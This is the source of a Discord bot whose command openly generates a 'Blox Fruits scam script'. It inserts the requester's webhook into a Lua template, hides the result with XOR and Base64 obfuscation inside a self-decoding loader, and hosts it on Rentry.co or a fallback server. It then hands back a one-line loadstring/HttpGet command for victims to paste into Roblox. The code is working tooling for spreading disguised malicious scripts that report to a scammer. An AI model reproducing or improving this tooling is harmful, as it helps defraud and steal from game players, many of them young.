const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const express = require('express');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ----- Web server (only for health check & optional self‑host fallback) -----
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is alive!'));

// Also keep self‑host for fallback
const STORE_FILE = path.join(__dirname, 'scripts.json');
let scripts = new Map();
if (fs.existsSync(STORE_FILE)) {
    try {
        const data = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
        const now = Date.now();
        for (const [id, entry] of Object.entries(data)) {
            if (now < entry.expires) scripts.set(id, entry);
        }
    } catch (e) {}
}
function saveScripts() {
    const obj = Object.fromEntries(scripts);
    fs.writeFileSync(STORE_FILE, JSON.stringify(obj, null, 2));
}

app.get('/script/:id', (req, res) => {
    const id = req.params.id;
    const entry = scripts.get(id);
    if (!entry || Date.now() > entry.expires) {
        scripts.delete(id);
        saveScripts();
        return res.status(404).send('Script not found or expired.');
    }
    res.set('Content-Type', 'text/plain');
    res.send(entry.content);
});
app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));

// ----- Determine public base URL (for self‑host fallback) -----
const BASE_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL || `http://localhost:${PORT}`;
if (!BASE_URL.includes('localhost')) {
    console.log(`🌐 Public base URL: ${BASE_URL}`);
    // Self‑ping (keep Render awake)
    setInterval(() => axios.get(BASE_URL).catch(() => {}), 4 * 60 * 1000);
    setTimeout(() => axios.get(BASE_URL).catch(() => {}), 5000);
}

// ----- Discord Bot -----
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    const command = new SlashCommandBuilder()
        .setName('script')
        .setDescription('Generate a Blox Fruits scam script with your webhook')
        .addStringOption(option =>
            option.setName('game')
                .setDescription('Game name (only "bloxfruits" for now)')
                .setRequired(true)
                .addChoices({ name: 'Blox Fruits', value: 'bloxfruits' }))
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Your Discord username (for tracking)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Your Discord webhook URL')
                .setRequired(true));

    client.application.commands.create(command);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== 'script') return;

    await interaction.deferReply({ ephemeral: true });

    const game = interaction.options.getString('game');
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    if (game !== 'bloxfruits') {
        return interaction.editReply({ content: '❌ Only "bloxfruits" is supported right now.' });
    }
    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
        return interaction.editReply({ content: '❌ Invalid Discord webhook URL.' });
    }

    try {
        // ----- Read template -----
        const templatePath = path.join(__dirname, 'template.lua');
        if (!fs.existsSync(templatePath)) {
            return interaction.editReply({ content: '❌ Template file not found.' });
        }
        let template = fs.readFileSync(templatePath, 'utf8');
        template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
        template = template.replace(/\{\{USERNAME\}\}/g, username);

        // ----- Obfuscate locally -----
        const obfuscated = obfuscateScript(template);

        // ----- Try to upload to Rentry.co (primary) -----
        let rawUrl;
        let source = 'Rentry.co';
        try {
            const rentryRes = await axios.post('https://rentry.co/api/new', {
                text: obfuscated,
                // optional custom slug – set a random one to avoid collisions
                // url: `exodus_${Date.now()}`
            });
            if (rentryRes.data && rentryRes.data.url) {
                const slug = rentryRes.data.url.split('/').pop();
                rawUrl = `https://rentry.co/raw/${slug}`;
                console.log(`✅ Uploaded to Rentry: ${rawUrl}`);
            } else {
                throw new Error('Rentry response missing URL');
            }
        } catch (rentryError) {
            console.warn('⚠️ Rentry upload failed:', rentryError.message);
            // Fallback: self‑host
            source = 'Self‑host (backup)';
            const id = uuidv4();
            scripts.set(id, {
                content: obfuscated,
                expires: Date.now() + 24 * 60 * 60 * 1000
            });
            saveScripts();
            rawUrl = `${BASE_URL}/script/${id}`;
            if (BASE_URL.includes('localhost')) {
                return interaction.editReply({ 
                    content: '❌ Self‑host fallback is using localhost. Please set RENDER_EXTERNAL_URL environment variable.' 
                });
            }
        }

        // ----- Build loadstring -----
        const loadstringLine = `loadstring(game:HttpGet("${rawUrl}"))()`;

        // ----- Reply -----
        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ Script Generated')
            .setDescription(`**Game:** ${game}\n**User:** ${username}`)
            .addFields(
                { name: '📜 Loadstring (copy this)', value: `\`\`\`lua\n${loadstringLine}\n\`\`\``, inline: false },
                { name: '📦 Hosted on', value: source, inline: false },
                { name: '🔒 Obfuscation', value: 'XOR + Base64', inline: false }
            )
            .setTimestamp();

        await interaction.editReply({ embeds: [embed] });

        // ----- Self‑ping (if using self‑host fallback) -----
        if (source === 'Self‑host (backup)' && !BASE_URL.includes('localhost')) {
            axios.get(BASE_URL).catch(() => {});
        }

    } catch (error) {
        console.error(error);
        await interaction.editReply({ content: '❌ Failed to generate script: ' + error.message });
    }
});

// ----- Local obfuscator -----
function obfuscateScript(raw) {
    const key = Math.floor(Math.random() * 254) + 1;
    let xorEncoded = '';
    for (let i = 0; i < raw.length; i++) {
        xorEncoded += String.fromCharCode(raw.charCodeAt(i) ^ key);
    }
    const base64 = Buffer.from(xorEncoded, 'binary').toString('base64');
    return `-- Obfuscated with XOR + Base64
local function decode(str, key)
    local result = ""
    for i = 1, #str do
        result = result .. string.char(string.byte(str, i) ~ key)
    end
    return result
end

local encoded = "${base64}"
local key = ${key}
local decoded = decode(encoded, key)
loadstring(decoded)()
`;
}

client.login(process.env.DISCORD_TOKEN);
